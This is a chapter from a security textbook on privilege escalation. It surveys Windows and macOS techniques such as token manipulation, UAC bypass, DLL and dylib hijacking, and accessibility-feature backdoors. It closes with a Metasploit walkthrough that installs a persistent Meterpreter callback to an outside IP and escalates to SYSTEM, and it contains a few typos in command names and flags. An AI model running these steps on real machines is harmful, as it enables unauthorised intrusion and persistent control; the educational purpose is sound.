<html><head></head><body>
        <section>

                            <header>
                    <h1 class="header-title">Privilege Escalation</h1>
                </header>
            
            <article>
                
<p>The previous chapters have explained the process of performing an attack to a point where the attacker can compromise a system. The previous <a href="9871410e-395d-4fcf-afe0-04e82f7883d3.xhtml" target="_blank">Chapter 7</a>, <em>Lateral Movement,</em> discussed how an attacker can move around in the compromised system without being identified or raising any alarms. A general trend was observable, where legitimate tools were being used to avoid alerts. A similar trend may also be observed in this phase of the attack life cycle.</p>
<p>In this chapter, close attention will be paid to how attackers heighten the privileges of the user accounts that they have compromised. The aim of an attacker at this stage is to have the required level of privileges to achieve a greater objective. It could be mass deletion, corruption, or theft of data, disabling of computers, destroying hardware, and so many other things. An attacker requires control over access systems so that he can succeed with all of his plans. Mostly, attackers seek to acquire admin-level privileges before they start the actual attack. Many system developers have been employing the least privilege rule, where they assign users the least amount of privileges that are needed to perform their jobs. Therefore, most accounts do not have sufficient rights that can be abused to access or make changes to some files. Hackers will normally compromise these low-privileged accounts and, thus, have to upgrade them to higher privileges in order to access files or make changes to a system.</p>
<p>This chapter will cover the following topics:</p>
<ul>
<li>Infiltration</li>
<li>Avoiding alerts</li>
<li>Performing privilege escalation</li>
<li>Conclusion</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Infiltration</h1>
                </header>
            
            <article>
                
<p>Privilege escalation normally occurs deep into an attack. This means that the attacker will have already done reconnaissance and successfully compromised a system, thereby gaining entry. After this, the attacker will have traversed the compromised system through lateral movement and identified all the systems and devices of interest. In this phase, the attacker wants to have a strong grip on the system. The attacker may have compromised a low-level account and will, therefore, be looking for an account with higher privileges, in order to study the system further or get ready to give the final blow. Privilege escalation is not a simple phase, as it will at times require the attacker to use a combination of skills and tools in order to heighten the privileges. There are generally two classifications of privilege escalation: horizontal and vertical privilege escalation.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Horizontal privilege escalation</h1>
                </header>
            
            <article>
                
<p>In horizontal privilege escalation, the attacker uses a normal account to access the accounts of other users. It is a simple process since the attacker does not actively seek to upgrade the privileges of an account, they are granted to him. Therefore, no tools are used to upgrade the accounts in this type of privilege escalation. There are two main ways through which a horizontal privilege escalation can occur. The first one is through software bugs, whereby a normal user is able to view and access files of other users due to an error in the coding of a system. As can be seen, no tools have been used and yet an attacker is able to access files that should have otherwise been protected from the eyes of normal users.</p>
<p>Another instance is that wherein the attacker is lucky to compromise an administrator's account. In this scenario, there will be no need to use hacking tools and techniques to escalate the privileges of the account that the user has hacked. Already adorned with the admin-level privileges, attackers can go on with the attack by creating other admin-level users or just use the already hacked account to execute the attack. Horizontal privilege escalation attacks are normally facilitated by tools and techniques that steal login credentials at the phase where hackers compromise a system. A number of tools were discussed in the chapter on compromising the system, where it was shown that a hacker can recover passwords, steal them from users, or crack directly into accounts. In fortunate scenarios for the hacker, the user accounts compromised will belong to users with high-level privileges. Therefore, they will not have to face any hardships of having to upgrade an account.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Vertical privilege escalation</h1>
                </header>
            
            <article>
                
<p>The other type of privilege escalation is vertical privilege escalation. It consists of more demanding privilege escalation techniques and includes the use of hacking tools. It is complex, but not impossible, since an attacker is forced to perform admin-or kernel-level operations in order to elevate access rights illegally. Vertical rights escalation is more difficult but it is also more rewarding since the attacker can acquire system rights on a system. A system user has more rights than an administrator and, therefore, can do more damage. The attacker also has a higher chance of staying and performing actions on a network system whilst remaining undetected. With superuser access rights, an attacker can perform actions that the administrator cannot stop or interfere with. Vertical escalation techniques differ from system to system. In Windows, a common practice is to cause a buffer overflow to achieve vertical privilege escalation. This has already been witnessed in a tool called EternalBlue which is alleged to be one of the hacking tools in the possession of the NSA. The tool has however been made public by a hacking group called the Shadow Brokers.</p>
<p>On Linux, vertical escalation is done by allowing attackers to have root privileges that enable them to modify systems and programs. On Mac, vertical escalation is done in a process called <strong>jailbreaking</strong>, allowing the hackers to perform previously disallowed operations. These are operations that manufacturers restrict users from so as to protect the integrity of their devices and operating systems. Vertical escalation is also done on web-based tools. This is normally through the exploitation of the code used in the backend. At times, system developers unknowingly leave channels that can be exploited by hackers, especially during the submission of forms.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Avoiding alerts</h1>
                </header>
            
            <article>
                
<p>Just like in the preceding phases, it is in the interests of the hacker to avoid raising any alarms that the victim system has been compromised. Detection, especially at this phase, would be costly, as it would mean that all the efforts that an attacker had made will have been for nothing. Therefore, before the attacker performs this phase, it is normal to disable security systems if possible. The methods of privilege escalation are also quite sophisticated. Most of the time, the attacker will have to create files with malicious instructions, rather than use a tool to execute malicious actions against the system.</p>
<p>Most systems will be coded only to allow privileges to legitimate services and processes. Therefore, attackers will try to compromise these services and processes in order to be given the benefit of executing with heightened privileges. It is challenging for hackers to use brute force to get admin privileges and therefore they often opt to use the path of least resistance. If it means creating files identical to the ones a system recognizes to be legitimate, they will do so.</p>
<p>Another way to avoid alerts is by using legitimate tools to perform the attack. As mentioned in previous chapters, the use of PowerShell as a hacking tool is growing because of its power, and also because many systems will not raise alerts since this is a valid, built-in OS tool.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Performing privilege escalation</h1>
                </header>
            
            <article>
                
<p>Privilege escalation can be done in a number of ways, depending on the level of skill that the hacker has and the intended outcome of the privilege escalation process. In Windows, administrator access should be rare and normal users should not have administrative access to systems. However, sometimes it becomes necessary to give remote users admin access to enable them to troubleshoot and solve some issues. This is something that system administrators should be worried about. When giving remote users admin access, admins should be cautious enough to ensure that this type of access is not used for privilege escalation. There are risks when normal employees in an organization maintain admin access. They open a network to multiple attack vectors.</p>
<p>To begin with, malicious users can also use this access level to extract password hashes that can, later on, be used to recover the actual passwords or be used directly in remote attacks through pass-the-hash. This has already been exhaustively discussed in <a href="9871410e-395d-4fcf-afe0-04e82f7883d3.xhtml" target="_blank"><span class="ChapterrefPACKT">Chapter 7</span></a>, <em>Lateral Movement</em>. Another threat is that they can use their systems for packet capturing. They can also install software which might turn out to be malicious. Lastly, they can interfere with the registry. Therefore, it is assumed that it is bad for users to be given admin access.</p>
<p>Since admin access is a closely guarded privilege, attackers will mostly have to fight their way into getting the access using a number of tools and techniques. Apple computers have a somewhat more reliable operating system when it comes to security. However, there are a number of ways that attackers have discovered that can be used to perform privilege escalation in OS X.</p>
<p>The following are some of the commonly used privilege escalation methods.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Exploiting unpatched operating systems</h1>
                </header>
            
            <article>
                
<p>Windows, like many operating systems, keeps tabs on ways through which hackers can compromise it. It keeps on releasing patches to fix those avenues. However, some network administrators fail to install these patches in time. Some administrators forgo patching altogether. Therefore, there is a highly likely chance that an attacker will find machines that are unpatched. Hackers use scanning tools to find out information about the devices in a network and to identify the ones that are not patched. The tools that can be used for this have been discussed in the reconnaissance chapter; two of the most commonly used are Nessus and Nmap. After identifying the unpatched machines, hackers can search for exploits from Kali Linux that can be used to exploit them. Searchsploit will contain the corresponding exploits that can be used against unpatched computers. Once the exploits are found, the attacker will compromise the system. The attacker will then use a tool called PowerUp to bypass Windows privilege management and upgrade the user on the vulnerable machine to an admin.</p>
<p>If the attacker wants to avoid using scanning tools to verify the current system state, including patches, it is possible to use a WMI command-line tool called <kbd>wmic</kbd> to retrieve the list of updates installed, as shown as follows:</p>
<div class="packt_figure CDPAlignCenter CDPAlign"><img src="assets/3cd04d02-332e-43fd-8dbf-ae76af38eed1.png"/></div>
<p>Another option is to use the PowerShell command <kbd>get-hotix</kbd>:</p>
<div class="packt_figure CDPAlignCenter CDPAlign"><img src="assets/3bdf5e8a-5d71-4885-99dd-f4b1af3b8813.png"/></div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Access token manipulation</h1>
                </header>
            
            <article>
                
<p>In Windows, all processes are started by a certain user and the system knows the rights and privileges that the user has. Windows normally makes use of access tokens to determine the owners of all running processes. This technique of privilege escalation is used to make processes appear as if they were started by a different user than the one that actually started them. The way that Windows manages admin privileges is exploited. The operating system logs in admin users as normal users, but then executes their processes with admin privileges. Windows uses the <kbd>run as administrator</kbd> command to execute processes with the privileges of an administrator. Therefore, if an attacker can fool the system into believing that processes are being started by an admin, the processes will run without interference with full-level admin privileges.</p>
<p>Access token manipulation occurs when attackers cleverly copy access tokens from existing processes using built-in Windows API functions. They specifically target the processes that are started by admin users in a machine. When they paste an admin's access tokens to Windows as it starts a new process, it will execute the processes with admin privileges. Access token manipulation can also occur when hackers know an admin's credentials. These can be stolen in different types of attacks and then used for access token manipulation. Windows has an option of running an application as an administrator. To do this, Windows will request for a user to enter admin login credentials, so as to start a program/process with admin privileges.</p>
<p>Lastly, access token manipulation can also occur when an attacker uses stolen tokens to authenticate remote system processes provided that the tokens stolen have the appropriate permissions on the remote system.</p>
<p>Access token manipulation is highly used in Metasploit, a hacking and penetration testing tool that was discussed in <span class="ChapterrefPACKT"><a href="d07abf73-093e-4004-b690-1aa70db11902.xhtml" target="_blank">Chapter 5</a>,</span> <em>Compromising the System</em>. Metasploit has a Meterpreter payload that can perform token stealing and use the stolen tokens to run processes with escalated privileges. Metasploit also has a payload called <em>The Cobalt Strike</em> that also takes advantage of token stealing. The payload is able to steal and create its own tokens, which have admin privileges. The bottom line in this type of privilege escalation method is that there is an observable trend where attackers take advantage of an otherwise legitimate system. It could be said to be a form of defensive evasion on the side of an attacker.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Exploiting accessibility features</h1>
                </header>
            
            <article>
                
<p>Windows has several accessibility features that are supposed to help users to interact<span> better</span> with the OS and more attention is given to users that may have visual impairments. These features include; the magnifier, screen keyboard, display switch, and narrator. These features are conveniently placed on the Windows login screen so that they can be supportive to the user from the instant that he/she logs in. However, attackers can manipulate these features to create a backdoor through which they can log into the system without authentication. It is quite an easy process and can be executed in a matter of minutes. An attacker will be required to have compromised a Windows computer using a Linux LiveCD. This tool will allow the attacker to boot the computer with a temporary Linux Desktop OS. Once in the machine, the drive containing the Windows OS will be visible and editable. All these accessibility features are stored as executables in the <kbd>System32</kbd> folder. Therefore, a hacker will go and delete one or more of these and replace them with a command prompt or a backdoor. Once the replacement is done and the hacker has logged out, all will seem normal when the Windows OS is started. However, an attacker will have a walk-around to bypass the login prompt. When the OS displays the password prompt, the attacker can simply click on any of the accessibility features and launch the command prompt.</p>
<p>The command prompt that will display will be executing with system access, which is the highest level of privilege for a Windows machine. The attacker can use the command prompt to achieve other tasks. It can open browsers, install programs, create new users with privileges, and even install backdoors. An even more unique thing that an attacker can do is to launch the Windows Explorer by supplying the command <kbd>explorer.exe</kbd> into the command prompt. Windows Explorer will open on the computer that the attacker has not even logged into and it will open as a system user. This means that the attacker has exclusive rights to do whatever he pleases on the machine, without being requested to log in as an administrator. This method of privilege escalation is very effective, but it requires the attacker to have physical access to the target computer. Therefore, it is mostly done by insider threats or malicious actors that enter into an organization's premises through social engineering.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Application shimming</h1>
                </header>
            
            <article>
                
<p>Application shimming is a Windows Application Compatibility framework that Windows created to allow programs to run on versions of the OS that they were not initially created to run on. Most applications that used to run on Windows XP can today run on Windows 10 due to this framework. The operation of the framework is quite simple: it creates a shim to buffer between a legacy program and the operating system. During execution of programs, the shim cache is referenced to find out whether they will need to use the shim database. If so, the shim database will use an API to ensure that the program's codes are redirected effectively, so as to communicate with the OS. Since shims are in direct communication with the OS, Windows decided to add a safety feature where they are designed to run in user mode.</p>
<p>Without admin privileges, the shims cannot modify the kernel. However, attackers have been able to create custom shims that can bypass user account control, inject DLLs into running processes, and meddle with memory addresses. These shims can enable an attacker to run their own malicious programs with elevated privileges. They can also be used to turn off security software, especially the Windows Defender.</p>
<p>The following diagram illustrates the use of a custom shim against a new version of the Windows OS:</p>
<div class="packt_figure CDPAlignCenter CDPAlign"><img height="121" width="482" src="assets/66661c7d-9da7-422f-83ea-b30b512ca0f9.png"/></div>
<p>It is good to look at an example of how a shim is created. First, you need to start the <span class="packt_screen">Compatibility Administrator</span> from the <span class="packt_screen">Microsoft Application Compatibility Toolkit</span>.</p>
<p>This following figure shows Microsoft's application compatibility toolkit (12)<sup>:</sup></p>
<div class="packt_figure CDPAlignCenter CDPAlign"><img height="404" width="342" src="assets/6762f948-2c0a-4ace-8560-77845b96e969.png"/></div>
<p>Next, you have to create a new database in <span class="packt_screen">Custom Databases</span> by right-clicking on the <span class="packt_screen">New Database(1)</span> option and selecting to create a new application fix.</p>
<p>The following figure shows the process of creating a new application fix (12):</p>
<div class="packt_figure CDPAlignCenter CDPAlign"><img height="250" width="346" src="assets/e1fd731b-099f-4598-a5d0-9fadecfabf63.png"/></div>
<p>The next step is to give details of the particular program you want to create a shim for:</p>
<div class="packt_figure CDPAlignCenter CDPAlign"><img height="326" width="361" src="assets/f4c20cbb-6c29-4914-a8ba-0c3ee3e681e6.png"/></div>
<p>Next, you have to select the version of Windows that the shim is being created for. After selecting the Windows version, a number of compatibility fixes will be shown for the particular program. You are at liberty to choose the fixes that you want:</p>
<div class="packt_figure CDPAlignCenter CDPAlign"><img height="397" width="443" src="assets/879a9a1b-ab3a-4bf1-8820-880cef44e705.png"/></div>
<p>After clicking on <span class="packt_screen">Next</span>, all the fixes you've chosen will be shown and you can click on <span class="packt_screen">Finish</span> to end the process. The shim will be stored in the new database. To apply it, you need to right-click on the new database and click on install. Once this is done, the program will be run with all the compatibility fixes you've selected in your shim:</p>
<div class="packt_figure CDPAlignCenter CDPAlign"><img height="391" width="432" src="assets/400bac80-f100-462b-b564-1408d2ee2d7b.jpg"/></div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Bypassing user account control</h1>
                </header>
            
            <article>
                
<p>Windows has a well-structured mechanism for controlling the privileges of all users in a network and on the local machine. It has a Windows <span class="packt_screen">User Account Control</span> (<strong>UAC</strong>) feature that acts as a gate between normal users and admin level users. The Windows UAC feature is used to give permissions to the program, to elevate their privileges, and to run with admin-level privileges. Therefore, Windows always prompts users to permit programs that want to execute with this level of access. It is also notable that only admin users can allow programs to run with these privileges. Therefore, a normal user will be denied permission to allow a program to execute a program with admin privileges.</p>
<p>This looks like a failure-proof mechanism, whereby only administrators can allow programs to run with heightened privileges since they can easily tell the malicious programs from the genuine ones. However, there are some gaps in this mechanism of securing the system. Some Windows programs are allowed to elevate privileges or execute COM objects that are elevated without prompting a user first.</p>
<p>For instance, <kbd>rundl32.exe</kbd> is used to load a custom DLL that loads a COM object that has elevated privileges. This performs file operations even in protected directories that would normally require a user to have elevated access. This opens the UAC mechanism to compromise from knowledgeable attackers. The same processes used to allow Windows programs to run unauthenticated can allow malicious software to run with admin access in the same way. Attackers can inject a malicious process into a trusted process and thereby gain the advantage of running the malicious processes with admin privileges without having to prompt a user.</p>
<p>There are other ways that black hats have discovered that can be used to bypass UAC. There have been many methods published on GitHub that can potentially be used against UAC. One of these is <kbd>eventvwr.exe</kbd>, which can be compromised since it is normally auto-elevated when it runs and can, therefore, be injected with specific binary codes or scripts. Another approach to defeating the UAC is simply through the theft of admin credentials. The UAC mechanism is said to be a single security system and, therefore, the privileges of a process running on one computer remain unknown to lateral systems. Therefore, it is hard to nab attackers misusing the admin credentials to start processes with high-level privileges.</p>
<div class="packt_infobox">To bypass UAC in Windows 7, you can also use the <kbd>uacscript</kbd>, which you can download from <a href="https://github.com/Vozzie/uacscript"><span class="URLPACKT">https://github.com/Vozzie/uacscript</span></a><span class="URLPACKT">.</span></div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">DLL injection</h1>
                </header>
            
            <article>
                
<p>DLL injection is another privilege escalation method that attackers are using. It also involves the compromising of legitimate processes and services of the Windows operating system. DLL injection is used to run malicious code using the context of a legitimate process. By using the context of a process recognized to be legitimate, an attacker gains several advantages, especially the ability to access the processes memory and permissions. The attacker's actions are also masked by the legitimate processes. There has recently been a discovery of a rather sophisticated DLL injection technique called <strong>reflective DLL injection</strong> (13). It is more effective since it loads the malicious code without having to make the usual Windows API calls and therefore bypassing DLL load monitoring (13). It uses a clever process of loading a malicious library from the memory onto a running process. Instead of following the normal DLL injection process of loading a malicious DLL code from a path, a process that not only creates an external dependency and degrades the stealth of an attack, reflective DLL injection sources its malicious code in the form of raw data. It is more difficult to detect, even on machines that are adequately protected by security software. DLL injection attacks have been used by attackers to modify the Windows Registry, create threads and to do DLL loading. These are all actions that require admin privileges, but attackers sneak their way into doing them without such privileges.</p>
<p>The following diagram is a short illustration of how DLL injections work:</p>
<div class="packt_figure CDPAlignCenter CDPAlign"><img height="322" width="462" src="assets/51cafabe-4537-464d-a858-c4155d2e6e2c.png"/></div>
<p>It is important to keep in mind that DLL injection is not only used for privilege escalation. Here are some examples of malware that use the DLL injection technique to either compromise a system or propagate to others:</p>
<ul>
<li><strong>Backdoor.Oldrea</strong>: injects itself in the <kbd>explore.exe</kbd> process</li>
<li><strong>BlackEnergy</strong>: injects as a DLL into the <kbd>svchost.exe</kbd> process</li>
<li><strong>Duqu</strong>: injects itself in many processes to avoid detection</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">DLL search order hijacking</h1>
                </header>
            
            <article>
                
<p>DLL search order hijacking is another technique used to compromise DLLs and allow attackers to escalate their privileges, so as to progress with an attack. In this technique, attackers try to replace legitimate DLLs with malicious ones. Since the locations where programs store their DLLs can easily be identified, attackers may place malicious DLLs high up in the path traversed to find the legitimate DLL. Therefore, when Windows searches for a certain DLL in its normal location, it will find a DLL file with the same name but it will not be the legitimate DLL. Often, this type of attack occurs to programs that store DLLs in remote locations, such as in web shares. The DLLs are therefore more exposed to attackers and they no longer need physically to get to a computer so as to compromise files on hard drives.</p>
<p>Another approach to DLL search order hijacking is the modification of the ways in which programs load DLLs. Here, attackers modify the <em>manifest</em> or the <em>local direction</em> files to cause a program to load a different DLL than the intended one. The attackers may redirect the program to always load the malicious DLL and this will lead to a persistent privilege escalation. The attackers can also change the path to the legitimate DLLs back when the compromised program behaves abnormally. The targeted programs are the ones that execute with a high level of privileges. When done to the right program, the attacker could essentially escalate privileges to become a system user and, therefore, have access to more things.</p>
<p>DLL hijacking is complex and it requires lots of caution to prevent abnormal behavior by the victim program. In an unfortunate, or fortunate, event where a user realizes that an application is behaving erratically, he or she can simply uninstall it. This will consequently thwart a DLL hijacking attack.</p>
<p>The diagram below shows an illustration of search order hijacking where an attacker has placed a malicious DLL file on the search path of a legitimate DLL file:</p>
<div class="packt_figure CDPAlignCenter CDPAlign"><img height="163" width="468" src="assets/7f5eb5c3-752c-44de-878c-6d2ad2561873.png"/></div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Dylib hijacking</h1>
                </header>
            
            <article>
                
<p>Dylib hijacking is a method that is used against Apple computers. Computers that have Apple's OS X use a similar search method for finding dynamic libraries that should be loaded into programs. The search method is also based on paths and, as was seen in DLL hijacking, attackers can take advantage of these paths for privilege escalation purposes. Attackers conduct research to find out the dylibs that specific applications use and they then place a malicious version with a similar name high up in the search path. Therefore, when the operating system is searching for an application's dylib, it finds the malicious one first. If the targeted program runs with higher-level privileges than the user of the computer has, when it is started, it will auto-elevate the privileges. In this instance, it will have also have created an admin level access to the malicious dylib.</p>
<p>The following diagram illustrates the process of the dylib hijacking where attackers place a malicious dylib on the search path:</p>
<div class="packt_figure CDPAlignCenter CDPAlign"><img height="167" width="474" src="assets/1b882856-3e52-49a6-b202-778d42e9c9c7.png"/></div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Exploration of vulnerabilities</h1>
                </header>
            
            <article>
                
<p>The exploration of vulnerabilities is one of the few horizontal privilege escalations that gets used today. Due to the strictness in the coding and securing of systems, there tend to be fewer cases of horizontal privilege escalation. This type of privilege escalation is done on systems and programs that have programming errors. These programming errors may introduce vulnerabilities that attackers can exploit to bypass security mechanisms. Some systems will accept certain phrases as passwords for all users. This could probably be a programming error to allow system developers to quickly access systems. However, attackers may quickly discover this flaw and use it to access user accounts that have high privileges. Other errors in coding may allow attackers to change the access levels of users in the URL of a web-based system. In Windows, there was a programming error that allowed attackers to create their own Kerberos tickets with domain admin rights using regular domain user permissions. This vulnerability is called <strong>MS14-068</strong>. Even though system developers may be extremely careful, these errors show up at times and they provide attackers an avenue to quickly escalate privileges.</p>
<p>Sometimes, an attacker will take advantage of how the operating system works to exploit an unknown vulnerability.</p>
<p>A classic example of that is the use of the registry key <kbd>AlwaysInstallElevated</kbd>, which is present in the system (set to 1) and will allow the installation of a Windows Installer package with elevated (system) privileges. For this key to be considered enabled, the following values should be set to 1:</p>
<pre>[HKEY_CURRENT_USERSOFTWAREPoliciesMicrosoftWindowsInstaller] 
"AlwaysInstallElevated"=dword:00000001 
[HKEY_LOCAL_MACHINESOFTWAREPoliciesMicrosoftWindowsInstaller] 
"AlwaysInstallElevated"=dword:00000001 </pre>
<p>The attacker can use the <kbd>reg</kbd> query command to verify if this key is present; if it is not, the following message will appear:</p>
<div class="packt_figure CDPAlignCenter CDPAlign"><img src="assets/771f212f-ae0f-4de6-94c4-d72aeabe98f4.png"/></div>
<p>This might sound harmless, but if you think deeply you will notice the problem. You are basically giving system-level privileges to a regular user to execute an installer. What if this installer package has malicious content? Game over!</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Launch daemon</h1>
                </header>
            
            <article>
                
<p>Using a launch daemon is another privilege escalation method applicable to Apple-based operating systems, especially OS X. When OS X boots up, <kbd>launchd</kbd> is normally run to end system initialization. The process is responsible for loading the parameters for the daemons from the <kbd>plis</kbd>t files found in <kbd>/Library/LaunchDaemons</kbd>. The daemons have property list files that point to the executables to be auto-started. Attackers may take advantage of this auto-start process to perform privilege escalation. They may install their own launch daemons and configure them to start during the bootup process using the launched process. The attackers' daemons may be given disguised names from a related OS or application. Launch daemons are created with admin privileges but they execute with root privileges. Therefore, if the attackers are successful, they will have their daemons auto-started and their privileges escalated from admin to root. It can be noted that again, attackers are relying on an otherwise legitimate process in order to perform privilege escalation.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Hands-on example of privilege escalation on a Windows 8 target</h1>
                </header>
            
            <article>
                
<p>This hands-on illustration works on Windows 8 and has also been reported to be effective in Windows 10. It makes use of some techniques that have been discussed, that is, PowerShell and Meterpreter. It is a cunning technique that drives the user of the target machine to unknowingly allow a legitimate program to run which in turn does the privilege escalation. Therefore, it is the user that unknowingly allows malicious actors to escalate their privileges. The process starts within Metasploit and particularly on Meterpreter. Meterpreter is first used to establish a session with a target. This session is what the attackers use to send commands to the target and effectively control it.</p>
<p>The following is a script called <kbd>persistence</kbd> that an attacker can use to start a session with a remote target. The script creates a persistent listener on the victim's system that runs upon boot.</p>
<p>It is written as follows:</p>
<pre>meterpreter &gt;run persistence -A -L c:\ -X 30 -p 443 -r 10.108.210.25 </pre>
<p>This command starts a handler on the target (<kbd>A</kbd>), places Meterpreter at the <kbd>C</kbd> drive of the victim machine (<kbd>L c:\</kbd>) and instructs the listener to start on boot (<kbd>X</kbd>), make a check in intervals of 30 seconds (<kbd>i 30</kbd>), and to connect to port <kbd>443</kbd> of the victim's IP address. A hacker may check whether the connection was simple by sending a <kbd>reboot</kbd> command to the target machine and observing its behavior.</p>
<p>The <kbd>reboot</kbd> command is as follows:</p>
<pre>Meterpreter&gt; reboot </pre>
<p>If satisfied with the connection, the attacker may background the session and begin the privilege escalation attempt. Meterpreter will run the session in the background and allow Metasploit to carry out other exploits.</p>
<p>The following command is issued in the Metasploit terminal:</p>
<pre>Msf exploit (handler)&gt; Use exploit/windows/local/ask </pre>
<p>This is a command that works on all versions of Windows. It is used to request that the user on the target machine unknowingly escalates the execution level of the attacker. The user has to click <span class="packt_screen">OK</span> on a non-suspicious looking prompt on their screen requesting permission to run a program. The user consent is required and if it is not given, the privilege escalation attempt is not successful. Therefore, the attacker has to request the user to allow for the running of a legitimate program and this is where PowerShell comes in. Attackers, therefore, have to set the <kbd>ask</kbd> technique to be through PowerShell. This is done as follows:</p>
<pre>Msf exploit(ask)&gt; set TECHNIQUE PSH 
Msf exploit(ask)&gt; run </pre>
<p>At this point, a popup will appear on the target user's screen prompting them to allow the running of PowerShell, a completely legitimate Windows program. In most instances, the user will click <span class="packt_screen">OK</span>. With this permission, the attacker can use Powershell to migrate from being a normal user to a system user, as follows:</p>
<pre>Meterpreter&gt; migrate 1340 </pre>
<p>Thus, <kbd>1340</kbd> is listed as a system user on Metasploit. When this is successful, the attackers will have successfully acquired more privileges. A check on the privileges the attackers have should show that they have both admin and system rights. However, the <kbd>1340</kbd> admin user only has four Windows privileges and these are insufficient to perform a big attack. An attacker has to escalate his or her privileges further so as to have sufficient privileges to be able to perform more malicious actions. The attackers can then migrate to <kbd>3772</kbd> which is an <kbd>NT AuthoritySystem</kbd> user. This can be carried out using the following command:</p>
<pre> Meterpreter&gt; migrate 3772</pre>
<p>The attackers will still have the admin and root user rights and they will have additional Windows privileges. These additional privileges, 13 in number, can allow the attackers to do a myriad of things to the target using Metasploit.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Conclusion and lessons learned</h1>
                </header>
            
            <article>
                
<p>This chapter has discussed one of the most complex phases of an attack. Not all of the techniques used here are complex though. As has been said, there are two techniques; horizontal and vertical privilege escalation. Some attackers will use the horizontal privilege escalation methods because they are less tasking and easier to perform. However, veteran hackers who have a good understanding of the systems that they target use vertical privilege escalation methods. This paper has gone through some of these privilege escalation methods. It was clear from most methods that hackers had to target legitimate processes and services in order to escalate privileges. This is because most systems are built using the least privilege concept. Users are <span>purposefully </span>given the least privileges that they require to accomplish their roles. Only the legitimate services and processes are given high-level privileges and, therefore, attackers have to compromise them in most cases.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">References</h1>
                </header>
            
            <article>
                
<ol>
<li>A. Gouglidis, I. Mavridis and V. C. Hu, <em>Security policy verification for multi-domains in cloud systems</em>, International Journal of Information Security, vol. 13, (2), pp. 97-111, 2014. Available: <a href="https://search.proquest.com/docview/1509582424.%20DOI:%20http://dx.doi.org/10.1007/s10207-013-0205-x">https://search.proquest.com/docview/1509582424. DOI: http://dx.doi.org/10.1007/s10207-013-0205-x</a>.</li>
<li>T. Sommestad and F. Sandström, <em>An empirical test of the accuracy of an attack graph analysis tool</em>, Information and Computer Security, vol. 23, (5), pp. 516-531, 2015. Available: <a href="https://search.proquest.com/docview/1786145799">https://search.proquest.com/docview/1786145799</a>.</li>
<li>D. A. Groves, <em>Industrial Control System Security by Isolation: A Dangerous Myth</em>, American Water Works Association.Journal, vol. 103, (7), pp. 28-30, 2011. Available: <a href="https://search.proquest.com/docview/878745593">https://search.proquest.com/docview/878745593</a>.</li>
<li>P. Asadoorian, <em>Windows Privilege Escalation Techniques (Local) - Tradecraft Security Weekly #2 - Security Weekly</em>, Security Weekly, 2017. [Online]. Available: <a href="https://securityweekly.com/2017/05/18/windows-privilege-escalation-techniques-local-tradecraft-security-weekly-2/">https://securityweekly.com/2017/05/18/windows-privilege-escalation-techniques-local-tradecraft-security-weekly-2/</a>. [Accessed: 16- Aug- 2017].</li>
<li>C. Perez, <em>Meterpreter Token Manipulation</em>, Shell is Only the Beginning, 2017. [Online]. Available: <a href="https://www.darkoperator.com/blog/2010/1/2/meterpreter-token-manipulation.html">https://www.darkoperator.com/blog/2010/1/2/meterpreter-token-manipulation.html</a>. [Accessed: 16- Aug- 2017].</li>
<li>S. Knight, <em>Exploit allows command prompt to launch at Windows 7 login screen</em>, TechSpot, 2017. [Online]. Available: <a href="https://www.techspot.com/news/48774-exploit-allows-command-prompt-to-launch-at-windows-7-login-screen.html">https://www.techspot.com/news/48774-exploit-allows-command-prompt-to-launch-at-windows-7-login-screen.html</a>. [Accessed: 16- Aug- 2017].</li>
</ol>
<ol start="7">
<li><em>Application Shimming</em>, Attack.mitre.org, 2017. [Online]. Available: <a href="https://attack.mitre.org/wiki/Technique/T1138">https://attack.mitre.org/wiki/Technique/T1138</a>. [Accessed: 16- Aug- 2017].</li>
<li><em>Bypass User Account Control</em>, Attack.mitre.org, 2017. [Online]. Available: <a href="https://attack.mitre.org/wiki/Technique/T1088">https://attack.mitre.org/wiki/Technique/T1088</a>. [Accessed: 16- Aug- 2017].</li>
<li><em>DLL Injection</em>, Attack.mitre.org, 2017. [Online]. Available: <a href="https://attack.mitre.org/wiki/Technique/T1055">https://attack.mitre.org/wiki/Technique/T1055</a>. [Accessed: 16- Aug- 2017].</li>
<li><em>DLL Hijacking Attacks Revisited</em>, InfoSec Resources, 2017. [Online]. Available: <a href="http://resources.infosecinstitute.com/dll-hijacking-attacks-revisited/">http://resources.infosecinstitute.com/dll-hijacking-attacks-revisited/</a>. [Accessed: 16- Aug- 2017].</li>
<li><em>Dylib-Hijacking Protection</em>, Paloaltonetworks.com, 2017. [Online]. Available: <a href="https://www.paloaltonetworks.com/documentation/40/endpoint/newfeaturesguide/security-features/dylib-hijacking-protection.html">https://www.paloaltonetworks.com/documentation/40/endpoint/newfeaturesguide/security-features/dylib-hijacking-protection.html</a>. [Accessed: 16- Aug- 2017].</li>
